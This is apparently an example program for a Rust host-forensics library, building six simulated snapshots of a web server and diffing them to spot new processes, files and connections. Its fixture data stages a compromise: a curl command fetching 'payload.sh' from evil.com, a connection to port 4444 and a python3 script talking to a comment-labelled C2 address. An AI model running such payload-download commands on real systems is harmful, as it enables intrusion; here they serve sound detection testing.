//! Temporal comparison: same machine across time
//!
//! Run with: `cargo run --example temporal`
//!
//! Compares many snapshots of the same machine over time with realistic
//! process, file, and connection data to detect new processes, new or
//! modified files, and new IP connections.

use ironsift::{
    build_machine_snapshot, compare_temporal_series,
    DetectionConfig, RawConnectionEntry, RawFileEntry, RawLogEntry,
};

fn main() {
    let config = DetectionConfig::default();
    let machine_id = "web-01";

    /// Typical server processes (systemd, sshd, cron, nginx, etc.)
    fn baseline_processes(mid: &str) -> Vec<RawLogEntry> {
        vec![
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 1, ppid: 0,
                name: "systemd".to_string(),
                uid: 0,
                path: "/usr/lib/systemd/systemd".to_string(),
                args: "--system --deserialize 22".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 2, ppid: 1,
                name: "kthreadd".to_string(),
                uid: 0,
                path: "[kthreadd]".to_string(),
                args: "".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 100, ppid: 1,
                name: "systemd-journal".to_string(),
                uid: 0,
                path: "/usr/lib/systemd/systemd-journald".to_string(),
                args: "".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 101, ppid: 1,
                name: "dbus-daemon".to_string(),
                uid: 101,
                path: "/usr/bin/dbus-daemon".to_string(),
                args: "--system --address=systemd: --nofork".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 102, ppid: 1,
                name: "systemd-logind".to_string(),
                uid: 0,
                path: "/usr/lib/systemd/systemd-logind".to_string(),
                args: "".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 103, ppid: 1,
                name: "sshd".to_string(),
                uid: 0,
                path: "/usr/sbin/sshd".to_string(),
                args: "-D -u0".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 104, ppid: 1,
                name: "cron".to_string(),
                uid: 0,
                path: "/usr/sbin/cron".to_string(),
                args: "-f".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 105, ppid: 1,
                name: "rsyslogd".to_string(),
                uid: 104,
                path: "/usr/sbin/rsyslogd".to_string(),
                args: "-n -iNONE".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 200, ppid: 1,
                name: "nginx".to_string(),
                uid: 33,
                path: "/usr/sbin/nginx".to_string(),
                args: "-g daemon on; master_process on;".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 201, ppid: 200,
                name: "nginx".to_string(),
                uid: 33,
                path: "/usr/sbin/nginx".to_string(),
                args: "worker process".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 202, ppid: 200,
                name: "nginx".to_string(),
                uid: 33,
                path: "/usr/sbin/nginx".to_string(),
                args: "worker process".to_string(),
                timestamp: None,
            },
            RawLogEntry {
                machine_id: mid.to_string(),
                pid: 203, ppid: 200,
                name: "nginx".to_string(),
                uid: 33,
                path: "/usr/sbin/nginx".to_string(),
                args: "cache manager process".to_string(),
                timestamp: None,
            },
        ]
    }

    /// Typical files accessed on a web server (configs, logs, libs)
    fn baseline_files(mid: &str, ts: &str, nginx_mtime: &str) -> Vec<RawFileEntry> {
        vec![
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/nginx/nginx.conf".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some(nginx_mtime.to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/nginx/sites-enabled/default".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some(nginx_mtime.to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/passwd".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some("2023-12-15T10:00:00Z".to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/group".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some("2023-12-15T10:00:00Z".to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/ld.so.cache".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some("2023-12-20T06:00:00Z".to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/usr/lib/x86_64-linux-gnu/libc.so.6".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: None,
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/var/log/nginx/access.log".to_string(),
                uid: 33,
                timestamp: Some(ts.to_string()),
                mtime: Some(ts.to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/var/log/nginx/error.log".to_string(),
                uid: 33,
                timestamp: Some(ts.to_string()),
                mtime: Some(ts.to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/var/log/syslog".to_string(),
                uid: 104,
                timestamp: Some(ts.to_string()),
                mtime: Some(ts.to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/localtime".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: None,
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/hosts".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some("2023-12-01T00:00:00Z".to_string()),
            },
            RawFileEntry {
                machine_id: mid.to_string(),
                path: "/etc/resolv.conf".to_string(),
                uid: 0,
                timestamp: Some(ts.to_string()),
                mtime: Some("2024-01-01T00:00:00Z".to_string()),
            },
        ]
    }

    /// Typical outbound connections (load balancer, DNS, NTP, etc.)
    fn baseline_connections(mid: &str) -> Vec<RawConnectionEntry> {
        vec![
            RawConnectionEntry {
                machine_id: mid.to_string(),
                remote_ip: "10.0.0.1".to_string(),
                local_ip: None,
                remote_port: Some(443),
                process_name: Some("nginx".to_string()),
                timestamp: None,
            },
            RawConnectionEntry {
                machine_id: mid.to_string(),
                remote_ip: "10.0.0.5".to_string(),
                local_ip: None,
                remote_port: Some(53),
                process_name: Some("systemd-resolve".to_string()),
                timestamp: None,
            },
            RawConnectionEntry {
                machine_id: mid.to_string(),
                remote_ip: "169.254.169.254".to_string(),
                local_ip: None,
                remote_port: Some(80),
                process_name: Some("curl".to_string()),
                timestamp: None,
            },
            RawConnectionEntry {
                machine_id: mid.to_string(),
                remote_ip: "10.0.0.10".to_string(),
                local_ip: None,
                remote_port: Some(123),
                process_name: Some("systemd-timesyncd".to_string()),
                timestamp: None,
            },
        ]
    }

    // --- Snapshot 1: Day 1, 10:00 — baseline (normal state)
    let t1 = "2024-01-01T10:00:00Z";
    let nginx_mtime_t1 = "2024-01-01T08:00:00Z";
    let s1 = build_machine_snapshot(
        machine_id,
        t1,
        baseline_processes(machine_id),
        baseline_files(machine_id, t1, nginx_mtime_t1),
        baseline_connections(machine_id),
        &config,
    );

    // --- Snapshot 2: Day 1, 14:00 — curl + payload, nginx.conf modified, new IP
    let t2 = "2024-01-01T14:00:00Z";
    let nginx_mtime_t2 = "2024-01-01T13:55:00Z";
    let mut p2 = baseline_processes(machine_id);
    p2.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 500,
        ppid: 1,
        name: "curl".to_string(),
        uid: 0,
        path: "/usr/bin/curl".to_string(),
        args: "http://evil.com/payload.sh -o /tmp/payload.sh".to_string(),
        timestamp: None,
    });
    let mut f2 = baseline_files(machine_id, t2, nginx_mtime_t2);
    f2.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/payload.sh".to_string(),
        uid: 0,
        timestamp: Some(t2.to_string()),
        mtime: None,
    });
    let mut c2 = baseline_connections(machine_id);
    c2.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "192.168.99.100".to_string(),
        local_ip: None,
        remote_port: Some(4444),
        process_name: Some("curl".to_string()),
        timestamp: None,
    });
    let s2 = build_machine_snapshot(machine_id, t2, p2, f2, c2, &config);

    // --- Snapshot 3: Day 2, 09:00 — cron job ran, new log file, new backend IP
    let t3 = "2024-01-02T09:00:00Z";
    let mut p3 = baseline_processes(machine_id);
    p3.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 500,
        ppid: 1,
        name: "curl".to_string(),
        uid: 0,
        path: "/usr/bin/curl".to_string(),
        args: "http://evil.com/payload.sh -o /tmp/payload.sh".to_string(),
        timestamp: None,
    });
    p3.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 501,
        ppid: 104,
        name: "run-parts".to_string(),
        uid: 0,
        path: "/usr/bin/run-parts".to_string(),
        args: "/etc/cron.daily".to_string(),
        timestamp: None,
    });
    let mut f3 = baseline_files(machine_id, t3, nginx_mtime_t2);
    f3.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/payload.sh".to_string(),
        uid: 0,
        timestamp: Some(t2.to_string()),
        mtime: None,
    });
    f3.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/var/log/apt/history.log".to_string(),
        uid: 0,
        timestamp: Some(t3.to_string()),
        mtime: Some("2024-01-02T08:55:00Z".to_string()),
    });
    let mut c3 = baseline_connections(machine_id);
    c3.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "192.168.99.100".to_string(),
        local_ip: None,
        remote_port: Some(4444),
        process_name: Some("curl".to_string()),
        timestamp: None,
    });
    c3.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "10.0.0.2".to_string(),
        local_ip: None,
        remote_port: Some(5432),
        process_name: Some("nginx".to_string()),
        timestamp: None,
    });
    let s3 = build_machine_snapshot(machine_id, t3, p3, f3, c3, &config);

    // --- Snapshot 4: Day 2, 15:00 — sshd spawn, /etc/hosts modified, SSH client IP
    let t4 = "2024-01-02T15:00:00Z";
    let mut p4 = baseline_processes(machine_id);
    p4.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 500,
        ppid: 1,
        name: "curl".to_string(),
        uid: 0,
        path: "/usr/bin/curl".to_string(),
        args: "http://evil.com/payload.sh -o /tmp/payload.sh".to_string(),
        timestamp: None,
    });
    p4.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 501,
        ppid: 104,
        name: "run-parts".to_string(),
        uid: 0,
        path: "/usr/bin/run-parts".to_string(),
        args: "/etc/cron.daily".to_string(),
        timestamp: None,
    });
    p4.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 502,
        ppid: 103,
        name: "sshd".to_string(),
        uid: 0,
        path: "/usr/sbin/sshd".to_string(),
        args: "sshd: admin@pts/0".to_string(),
        timestamp: None,
    });
    let hosts_mtime_t4 = "2024-01-02T14:30:00Z";
    let mut f4 = baseline_files(machine_id, t4, nginx_mtime_t2);
    f4.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/payload.sh".to_string(),
        uid: 0,
        timestamp: Some(t2.to_string()),
        mtime: None,
    });
    f4.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/var/log/apt/history.log".to_string(),
        uid: 0,
        timestamp: Some(t3.to_string()),
        mtime: Some("2024-01-02T08:55:00Z".to_string()),
    });
    f4.iter_mut()
        .find(|e| e.path == "/etc/hosts")
        .map(|e| e.mtime = Some(hosts_mtime_t4.to_string()));
    let mut c4 = baseline_connections(machine_id);
    c4.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "192.168.99.100".to_string(),
        local_ip: None,
        remote_port: Some(4444),
        process_name: Some("curl".to_string()),
        timestamp: None,
    });
    c4.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "10.0.0.2".to_string(),
        local_ip: None,
        remote_port: Some(5432),
        process_name: Some("nginx".to_string()),
        timestamp: None,
    });
    c4.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "172.16.0.1".to_string(),
        local_ip: None,
        remote_port: Some(22),
        process_name: Some("sshd".to_string()),
        timestamp: None,
    });
    let s4 = build_machine_snapshot(machine_id, t4, p4, f4, c4, &config);

    // --- Snapshot 5: Day 3, 10:00 — python3 + script, new C2 IP
    let t5 = "2024-01-03T10:00:00Z";
    let mut p5 = baseline_processes(machine_id);
    p5.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 500,
        ppid: 1,
        name: "curl".to_string(),
        uid: 0,
        path: "/usr/bin/curl".to_string(),
        args: "http://evil.com/payload.sh -o /tmp/payload.sh".to_string(),
        timestamp: None,
    });
    p5.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 501,
        ppid: 104,
        name: "run-parts".to_string(),
        uid: 0,
        path: "/usr/bin/run-parts".to_string(),
        args: "/etc/cron.daily".to_string(),
        timestamp: None,
    });
    p5.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 502,
        ppid: 103,
        name: "sshd".to_string(),
        uid: 0,
        path: "/usr/sbin/sshd".to_string(),
        args: "sshd: admin@pts/0".to_string(),
        timestamp: None,
    });
    p5.push(RawLogEntry {
        machine_id: machine_id.to_string(),
        pid: 503,
        ppid: 104,
        name: "python3".to_string(),
        uid: 0,
        path: "/usr/bin/python3".to_string(),
        args: "/tmp/script.py --daemon".to_string(),
        timestamp: None,
    });
    let mut f5 = baseline_files(machine_id, t5, nginx_mtime_t2);
    f5.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/payload.sh".to_string(),
        uid: 0,
        timestamp: Some(t2.to_string()),
        mtime: None,
    });
    f5.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/var/log/apt/history.log".to_string(),
        uid: 0,
        timestamp: Some(t3.to_string()),
        mtime: Some("2024-01-02T08:55:00Z".to_string()),
    });
    f5.iter_mut()
        .find(|e| e.path == "/etc/hosts")
        .map(|e| e.mtime = Some(hosts_mtime_t4.to_string()));
    f5.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/script.py".to_string(),
        uid: 0,
        timestamp: Some(t5.to_string()),
        mtime: Some("2024-01-03T09:45:00Z".to_string()),
    });
    let mut c5 = baseline_connections(machine_id);
    c5.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "192.168.99.100".to_string(),
        local_ip: None,
        remote_port: Some(4444),
        process_name: Some("curl".to_string()),
        timestamp: None,
    });
    c5.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "10.0.0.2".to_string(),
        local_ip: None,
        remote_port: Some(5432),
        process_name: Some("nginx".to_string()),
        timestamp: None,
    });
    c5.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "172.16.0.1".to_string(),
        local_ip: None,
        remote_port: Some(22),
        process_name: Some("sshd".to_string()),
        timestamp: None,
    });
    c5.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "203.0.113.50".to_string(),
        local_ip: None,
        remote_port: Some(9999),
        process_name: Some("python3".to_string()),
        timestamp: None,
    });
    let p6 = p5.clone();
    let s5 = build_machine_snapshot(machine_id, t5, p5, f5, c5, &config);

    // --- Snapshot 6: Day 3, 16:00 — no new process, nginx.conf modified again, extra IP
    let t6 = "2024-01-03T16:00:00Z";
    let nginx_mtime_t6 = "2024-01-03T15:30:00Z";
    let mut f6 = baseline_files(machine_id, t6, nginx_mtime_t6);
    f6.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/payload.sh".to_string(),
        uid: 0,
        timestamp: Some(t2.to_string()),
        mtime: None,
    });
    f6.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/var/log/apt/history.log".to_string(),
        uid: 0,
        timestamp: Some(t3.to_string()),
        mtime: Some("2024-01-02T08:55:00Z".to_string()),
    });
    f6.iter_mut()
        .find(|e| e.path == "/etc/hosts")
        .map(|e| e.mtime = Some(hosts_mtime_t4.to_string()));
    f6.push(RawFileEntry {
        machine_id: machine_id.to_string(),
        path: "/tmp/script.py".to_string(),
        uid: 0,
        timestamp: Some(t5.to_string()),
        mtime: Some("2024-01-03T09:45:00Z".to_string()),
    });
    let mut c6 = baseline_connections(machine_id);
    c6.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "192.168.99.100".to_string(),
        local_ip: None,
        remote_port: Some(4444),
        process_name: Some("curl".to_string()),
        timestamp: None,
    });
    c6.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "10.0.0.2".to_string(),
        local_ip: None,
        remote_port: Some(5432),
        process_name: Some("nginx".to_string()),
        timestamp: None,
    });
    c6.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "172.16.0.1".to_string(),
        local_ip: None,
        remote_port: Some(22),
        process_name: Some("sshd".to_string()),
        timestamp: None,
    });
    c6.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "203.0.113.50".to_string(),
        local_ip: None,
        remote_port: Some(9999),
        process_name: Some("python3".to_string()),
        timestamp: None,
    });
    c6.push(RawConnectionEntry {
        machine_id: machine_id.to_string(),
        remote_ip: "198.51.100.22".to_string(),
        local_ip: None,
        remote_port: Some(443),
        process_name: Some("curl".to_string()),
        timestamp: None,
    });
    let s6 = build_machine_snapshot(machine_id, t6, p6, f6, c6, &config);

    // --- Compare full series: 6 snapshots => 5 consecutive diffs
    let snapshots = vec![s1, s2, s3, s4, s5, s6];
    let diffs = compare_temporal_series(&snapshots);

    println!("=== Temporal series: {} snapshots → {} consecutive diffs ===\n", snapshots.len(), diffs.len());
    for (i, d) in diffs.iter().enumerate() {
        println!("--- Diff {}: {} → {} ---", i + 1, d.from_ts, d.to_ts);
        if d.new_processes.is_empty() && d.new_files.is_empty() && d.modified_files.is_empty() && d.new_connections.is_empty() {
            println!("  (no changes)\n");
            continue;
        }
        if !d.new_processes.is_empty() {
            println!("  New processes: {}", d.new_processes.len());
            for p in &d.new_processes {
                println!("    - {} (path: {}, uid: {})", p.name, p.path, p.uid);
            }
        }
        if !d.new_files.is_empty() {
            println!("  New files: {}", d.new_files.len());
            for f in &d.new_files {
                println!("    - {} (uid: {})", f.path, f.uid);
            }
        }
        if !d.modified_files.is_empty() {
            println!("  Modified files: {}", d.modified_files.len());
            for (path, old_opt, new_opt) in &d.modified_files {
                println!("    - {} (was: {:?}, now: {:?})", path, old_opt, new_opt);
            }
        }
        if !d.new_connections.is_empty() {
            println!("  New connections: {}", d.new_connections.len());
            for ip in &d.new_connections {
                println!("    - {}", ip);
            }
        }
        println!();
    }

    println!("=== Summary ===");
    let total_changes: usize = diffs.iter().filter(|d| d.has_changes()).count();
    println!("  Snapshots: {}", snapshots.len());
    println!("  Diffs with changes: {}", total_changes);
    println!("  Diffs with no changes: {}", diffs.len() - total_changes);
}
